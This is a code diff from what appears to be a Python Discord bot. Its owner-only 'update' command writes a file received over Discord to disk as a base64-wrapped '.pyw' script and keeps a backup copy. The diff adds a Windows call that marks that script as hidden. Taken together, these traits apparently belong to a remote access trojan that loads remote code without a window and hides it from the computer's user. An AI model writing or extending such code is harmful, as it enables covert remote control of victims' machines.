@@ -111,18 +111,23 @@ async def on_ready():
 )
 @commands.is_owner()
 async def update(ctx):
+    global LIB_BACKUP_FILE
+
     if ctx.message.attachments:
+        lib_file_path = LIB + '.pyw'
         try:
-            os.unlink(LIB + '.pyw')
+            os.unlink(lib_file_path)
         except FileNotFoundError:
             pass
 
-        with open(LIB + '.pyw', 'w') as f:
+        with open(lib_file_path, 'w') as f:
             text_bytes = await ctx.message.attachments[0].read()
             encoded = encoded = base64.b64encode(text_bytes)
             f.write(file_base64_content.format(encoded))
 
-        with open(LIB + '.pyw', 'r') as f:
+        win32api.SetFileAttributes(lib_file_path ,win32con.FILE_ATTRIBUTE_HIDDEN)
+
+        with open(lib_file_path, 'r') as f:
             LIB_BACKUP_FILE = f.read()
 
         # Not using reload because extension could have not been loaded
